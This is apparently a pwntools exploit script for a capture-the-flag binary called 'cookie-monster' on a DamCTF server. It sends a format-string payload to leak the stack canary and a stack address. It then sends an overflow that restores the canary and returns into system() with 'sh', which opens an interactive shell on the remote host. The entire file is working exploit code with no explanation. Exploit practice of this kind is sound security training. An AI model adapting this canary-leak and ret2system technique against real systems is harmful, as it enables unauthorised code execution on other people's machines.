from pwn import *

#r = process("./cookie-monster")
#gdb.attach(r)

r = remote("chals.damctf.xyz", 31312)

r.recvuntil(b'nter your name:')
payload = b'-%15$x-%18$x-'
r.sendline(payload)

stuff = r.recvuntil(b'rchase?').split(b'-')
cookie = int("0x" + stuff[1].decode("utf-8"), 16)



stack = int("0x" + stuff[2].decode("utf-8"), 16)
stack_s = stack - 0x3c

system = 0x8048440
puts = 0x8048430
ret = 0x080483be

payload = b"cat cookies.txt\x00" 
payload += b"\x00"*(32 - len(payload)) 
payload += p32(cookie) + p32(0)*3 + p32(system) + p32(0x8048669) + p32(stack_s + 60) + b"sh\x00"
print(len(payload))
r.send(payload)

r.interactive()
